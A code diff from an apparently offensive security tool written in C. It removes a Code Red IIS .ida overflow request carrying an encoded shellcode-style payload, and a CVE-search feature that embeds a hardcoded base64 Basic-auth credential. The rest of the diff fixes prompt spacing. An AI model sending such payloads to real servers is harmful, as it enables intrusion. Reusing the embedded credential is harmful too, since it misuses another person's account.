@@ -129,24 +129,9 @@ int any(int type){
 			snprintf(cmd,sizeof(cmd),"nmap -sV -p %d --script vulners %s",portUnderHacking, target.strTargetIp);
 			system_call(cmd);
 			break;
-		case ANY_CODE_RED:
-			snprintf(msg, sizeof(msg),"%s%c%c%c%c", "GET /C_DEFAULT.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
-					"NNNNNNNNNNNNNNNNNN NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
-					"NNNNNNNNNNNN NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
-					"NNNNNN NNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u780"
-					"1%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078"
-					"%u0000%u00=a HTTP/1.0",'\r','\n','\r','\n');
-			int sk=0;
-			int bytesRecv=send_msg_to_server(&sk,target.targetIp,NULL, portUnderHacking, target.ports[portUnderHacking].connectionType
-					,msg, strlen(msg),&serverResp,BUFFER_SIZE_128K,0);
-			close(sk);
-			if(bytesRecv==RETURN_ERROR) show_message("Error creating socket. Maybe the port is blocked. Wait, and try again in a while.",0,0, ERROR_MESSAGE,1);
-			show_message((char *) serverResp,bytesRecv,0, RESULT_MESSAGE, TRUE);
-			if(serverResp!=NULL) free(serverResp);
-			break;
 		case ANY_SEARCH_MSF:
 			do{
-				char *strSearch= get_readline("  Insert string to search(;=exit): ", TRUE);
+				char *strSearch= get_readline("  Insert string to search (;=exit): ", TRUE);
 				if(strcmp(strSearch,";")==0){
 					printf("\n");
 					free(strSearch);
@@ -205,7 +190,7 @@ int any(int type){
 			break;
 		case ANY_SEARCH_NMAP:
 			do{
-				char *strSearch=get_readline("  Insert string to search(;=exit): ", TRUE);
+				char *strSearch=get_readline("  Insert string to search (;=exit): ", TRUE);
 				if(strcmp(strSearch,";")==0){
 					printf("\n");
 					free(strSearch);
@@ -289,89 +274,6 @@ int any(int type){
 		case ANY_ARP_SNIFFING:
 			arp(ANY_ARP_SNIFFING);
 			PRINT_RESET;
-			break;
-		case ANY_SEARCH_CVE:
-			srand(time(0));
-			char httpMsg[BUFFER_SIZE_512B]="";
-			char *host="www.opencve.io";
-			char *nistIP=hostname_to_ip(host);
-			if(nistIP==NULL) return RETURN_ERROR;
-			struct in_addr ip;
-			ip.s_addr=inet_addr(nistIP);
-			do{
-				cancelCurrentProcess=FALSE;
-				unsigned char *serverResp=NULL;
-				char *msg=get_readline(";=exit)-> ", TRUE);
-				if(strcmp(msg,";")==0){
-					free(msg);
-					break;
-				}
-				for(int i=0;i<strlen(msg);i++){
-					if(msg[i]==' ' || msg[i]=='\"') msg[i]='+';
-				}
-				snprintf(httpMsg,BUFFER_SIZE_512B,
-						"GET /api/cve?search=%s HTTP/1.1\r\n"
-						"Host: %s\r\n"
-						"Authorization: Basic THVjaDpMdWlzNzgh\r\n"
-						"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
-						"Accept: */*\r\n\r\n",msg,host);
-				free(msg);
-				int bytesRecv=0, sk=0;
-				if((bytesRecv=send_msg_to_server(&sk,ip,host, 443, SSL_CONN_TYPE, httpMsg,strlen(httpMsg),
-						&serverResp,BUFFER_SIZE_16K,30000))<0){
-					return RETURN_ERROR;
-				}
-				close(sk);
-				char *token="\"id\": \"";
-				char *json=strstr((char *)serverResp,token);
-				if(json==NULL){
-					free(serverResp);
-					show_message("No results found.", strlen("No results found."), 0, INFO_MESSAGE, TRUE);
-					PRINT_RESET;
-					continue;
-				}
-				int cont=0, cveId=1;
-				while(json!=NULL && cont<bytesRecv){
-					printf("%s\n\t%d) ",C_HWHITE,cveId);
-					for(cont=strlen(token);;cont++){
-						if((json[cont]=='"'&& json[cont+1]==',') || cont>=bytesRecv) break;
-						printf("%c",json[cont]);
-						json[cont-strlen(token)]='X';
-					}
-					printf("%s:",C_DEFAULT);
-					cont+=2;
-					for(int i=cont+strlen("\"summary\": ");;i++,cont++){
-						if((json[i]=='"'&& json[i+1]==',') || cont>=bytesRecv) break;
-						if(json[i]=='\\'){
-							switch(json[i+1]){
-							case 'n':
-								//printf("");
-								break;
-							case '"':
-								printf("\"");
-								break;
-							case '\\':
-								printf("\\");
-								break;
-							default:
-								break;
-							}
-							i++;
-							continue;
-						}
-						printf("%c",json[i]);
-					}
-					printf("\"\n  ");
-					json=strstr(json,token);
-					if(cont>=bytesRecv || cveId==20){
-						show_message("Max. size per page achieved.", 0, 0, ERROR_MESSAGE, TRUE);
-						break;
-					}
-					cveId++;
-				}
-				free(serverResp);
-				PRINT_RESET;
-			}while(TRUE);
 			break;
 		default:
 			break;
